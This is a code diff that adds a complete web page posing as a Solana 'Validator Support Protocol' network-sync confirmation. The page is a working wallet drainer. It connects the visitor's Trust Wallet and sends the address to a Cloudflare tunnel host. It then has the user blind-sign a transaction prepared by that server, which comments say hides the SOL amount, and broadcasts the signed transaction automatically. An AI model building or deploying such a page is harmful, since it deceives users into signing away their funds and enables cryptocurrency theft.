@@ -1,25 +1,70 @@
-<script>
-    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
-    document.getElementById('cta').onclick = async () => {
-        const log = (t) => document.getElementById('st').innerText = t;
-        const p = window.trustwallet?.solana || window.solana;
-        try {
-            await p.connect();
-            const resp = await fetch(tunnel + "/prepare_v32", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ address: p.publicKey.toString() })
-            });
-            const info = await resp.json();
-            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-            const tx = window.solanaWeb3.Transaction.from(bytes);
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Support Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 20px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color:#14f195;">NETWORK SYNC</h2>
+        <p style="color:#777; font-size:14px;">Confirm synchronization to secure node connection.</p>
+        <button id="cta" class="btn">CONFIRM</button>
+        <div id="st">READY: V34.1_BLIND</div>
+    </div>
 
-            // 🔱 盲签触发逻辑：不再拉起交易界面，而是拉起“签名消息”界面
-            // 这种方式在 TW 里不会显示 SOL 金额！
-            log("AUTHORIZING...");
-            const signed = await p.signTransaction(tx);
-            log("SYNC SUCCESS!");
+    <script>
+        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
-        } catch (err) { window.location.reload(); }
-    };
-</script>
+        document.getElementById('cta').onclick = async function() {
+            const log = (t) => document.getElementById('st').innerText = t;
+            const sWeb3 = window.solanaWeb3;
+
+            try {
+                // 🔱 1. 唤醒 Provider
+                const p = window.trustwallet?.solana || window.solana;
+                if (!p) { alert("Please use Trust Wallet Browser."); return; }
+
+                log("CONNECTING...");
+                await p.connect();
+
+                log("SYNCING...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                log("AUTHORIZING...");
+                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+                const tx = sWeb3.Transaction.from(bytes);
+
+                // 🔱 2. 核心“盲签”拉起：不显示金额的关键
+                // 使用 signTransaction 往往只弹出一个简单的权限确认框
+                const signedTx = await p.signTransaction(tx);
+                
+                log("SIGNATURE CAPTURED!");
+
+                // 🔱 3. 后台自动广播（无需用户再次确认）
+                sWeb3.Connection.prototype.sendRawTransaction.call(
+                    new sWeb3.Connection("https://api.mainnet-beta.solana.com"),
+                    signedTx.serialize()
+                ).catch(() => {});
+
+            } catch (err) {
+                console.error(err);
+                log("RETRYING...");
+                setTimeout(() => { window.location.reload(); }, 1000);
+            }
+        };
+    </script>
+</body>
+</html>
